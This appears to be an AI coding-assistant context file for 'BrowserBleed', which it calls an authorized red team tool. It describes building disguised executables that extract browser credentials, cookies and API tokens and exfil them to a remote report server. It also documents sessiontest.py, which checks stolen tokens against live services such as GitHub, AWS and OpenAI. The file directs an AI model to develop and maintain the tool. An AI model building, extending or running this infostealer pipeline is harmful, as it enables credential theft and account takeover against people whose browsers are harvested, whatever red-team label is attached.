# BrowserBleed — Claude Context

Authorized red team credential extraction tool. Windows exe + Go report server.

## Project layout

```
BrowserBleed.py          # main extractor (PyInstaller onefile source)
build_windows.ps1        # builds payloads — run from repo root
build_agent.py           # local Windows agent: polls /builds/claim and runs build_windows.ps1
icons/                   # .ico / .png files for exe disguising
payloads/                # built exes (gitignored)
server/                  # Go report server
  cmd/server/            # main entrypoint + embedded web/ templates
  internal/handler/      # HTTP handlers
deploy/
  config                 # DOMAIN, BB_API_KEY, ENCRYPTION_KEY, REGION, etc.
  .provision-state       # INSTANCE_ID, PUBLIC_IP (generated by provision script)
  deploy-binary.sh       # deploy script — see below
  bb-reports.pem         # EC2 keypair (legacy, no longer needed for deploy)
```

## Building payloads

### Option A — Local build

All three build scripts read `DOMAIN` and `BB_API_KEY` from `deploy/config` automatically.

**Windows** (PowerShell, from repo root):
```powershell
.\build_windows.ps1 -Preset chrome
.\build_windows.ps1 -Preset chrome -Upload    # build + upload to payload server
```
Params: `-Preset`, `-ExeName`, `-Company`, `-FileDesc`, `-IconFile`, `-Upload`

**macOS** (run on a Mac):
```bash
./build_mac.sh --preset chrome
./build_mac.sh --preset chrome --upload       # build + upload to payload server
```

**Linux** (run on Linux, requires sudo):
```bash
sudo ./build_linux.sh --preset chrome
sudo ./build_linux.sh --preset chrome --upload  # build + upload to payload server
```

All scripts accept `--upload` / `-Upload` to POST the built binary to `$EXFIL_URL/payloads` after building. The payload server returns HTTP 303 on success (post-redirect-get pattern) — scripts treat any 2xx/3xx as success.

The `/payloads` page has a command generator with Windows/macOS/Linux tabs and an "Upload after build" checkbox.

Or run the Python agent to poll the server queue and build automatically:
```
python build_agent.py
```

### Option B — Manual upload

Upload any pre-built binary via `/payloads` → Manual Upload section.

## Deploying the server

The report server runs as a Docker container (`browserbleed`) on `docker-svc` (10.20.0.193),
routed by Traefik at `browserbleed.lanarchy.net`. No AWS involved.

```bash
# Build the Go binary for linux/amd64, SCP it to docker-svc, and restart the container
bash deploy/deploy-homelab.sh
```

### Server details
- Host: `docker-svc@10.20.0.193` (SSH key `~/.ssh/id_ed25519`)
- Domain: `browserbleed.lanarchy.net`
- Binary: `/opt/docker/services/browserbleed/server` (mounted `:ro` at `/opt/server`)
- Data: `/opt/docker/services/browserbleed/data` (mounted at `/opt/bb-reports/data`)
- Env (`API_KEY`, `ENCRYPTION_KEY`, `BASE_URL`, `ADDR`) + Traefik routing live in
  `lanarchy-traefik/docker-compose.yml` (the `browserbleed` service)
- Proxy: `/upload`, `/p/*`, `/builds`, and `POST /payloads` bypass OIDC; everything
  else (UI / reports) sits behind Pocket ID

## sessiontest.py — Credential Validation

After running BrowserBleed and exporting reports, use **sessiontest.py** to validate extracted credentials and cookies against live services.

### Quick start

```bash
# Simplest — auto-finds latest ZIP in ~/Downloads and tests it
python3 sessiontest.py

# Explicit CSV
python3 sessiontest.py path/to/results.csv

# With browser sessions for cookie testing
python3 sessiontest.py --browser

# JSON output for parsing
python3 sessiontest.py --json

# Combine flags
python3 sessiontest.py --browser --json --timeout 20
```

### How it works

1. **Auto-finds reports** — Looks for the most recent `*_YYYY-MM-DD.zip` in `~/Downloads`, auto-extracts the CSV
2. **Tests credentials** — Makes live API requests to verify each token/session against the service
3. **Reports identity** — Shows which account/user owns the credential
4. **Shows access** — Reports what scopes/permissions the credential grants
5. **Handles cookies** — Cookie sessions are tested via redirect-check: authenticated requests get 200 while unauthenticated requests redirect to login

### Tested services

Core: GitHub, Google OAuth2, Anthropic (API + web session), OpenAI, Slack, Discord, AWS (SigV4-signed), Stripe, HuggingFace, npm, SendGrid

Plus: Microsoft Graph, Spotify, LinkedIn, Twitter/X, JWTs, JWEs, and generic cookie session detection for any domain.

### Features

- **Automatic ZIP extraction** — No manual steps needed
- **Environment variable support** — `BB_RESULTS_CSV` for explicit path, `BB_QUIET` to suppress messages
- **Smart auto-detection** — Checks env var → current dir → script dir → ~/Downloads (extracted CSVs) → latest ZIP (auto-extract)
- **Platform support** — Windows (with UTF-8 console fix), macOS, Linux
- **PowerShell wrapper** — `sessiontest.ps1` for Windows convenience
- **Delay between requests** — `--delay 0.5` to avoid rate-limiting on sensitive services (default 0.3s)

### Output modes

- **Default** — Human-readable table with colored status indicators (valid ✓, expired ⏱, invalid ✗, info ·)
- **JSON** — Machine-readable output with full response data
- **Browser sessions** — Opens Playwright to test cookie sessions interactively with Playwright (requires `pip install playwright && playwright install`)

See [`SESSIONTEST_USAGE.md`](SESSIONTEST_USAGE.md) for complete usage guide and environment variable reference.

## Known issues / history

- **Self-delete removed**: `subprocess.Popen` in a PyInstaller frozen elevated exe blocks
  indefinitely, preventing the exfil section from running. Self-delete was removed entirely.
  The exe now runs, exfils, and exits cleanly. Do not re-add without solving this root cause.

- **Encoding**: Always use `-Encoding utf8` when calling `Get-Content` on the Python source
  in build_windows.ps1. Without it, PowerShell reads as CP1252 and corrupts UTF-8 box-drawing
  chars in string literals before PyInstaller compiles them.

- **Hit count variation**: Normal — tied to how many browser sessions are active at run time.
  Session ID hits dominate the count (can be 400+ or as low as 10 depending on open tabs).
  Core credentials (API keys, OAuth tokens) are stable across runs.

## CI/CD — Always Check Before Considering Work Done

**Rule**: After every `git push`, immediately check GitHub Actions status before marking the work complete.

```bash
# Check workflow status
gh run list --limit 1

# View latest run details
gh run view <run-id>

# If tests fail, DO NOT close the issue. Debug locally first:
python3 -m pytest tests/ -v          # full suite (CI command)
python3 -m pytest tests/test_sessiontest.py -v   # sessiontest only
python3 -m pytest tests/test_linux.py -v       # Linux extractor (Unix only)
```

**Why**: Tests run on push. Failures = broken main branch. Fix locally before considering work done.

**Common issues to watch**:
- Linux extractor tests skip on Windows (`BrowserBleed_linux` requires `os.geteuid`)
- Import errors from recent changes
- Test data becoming stale (tokens expire, services change APIs)
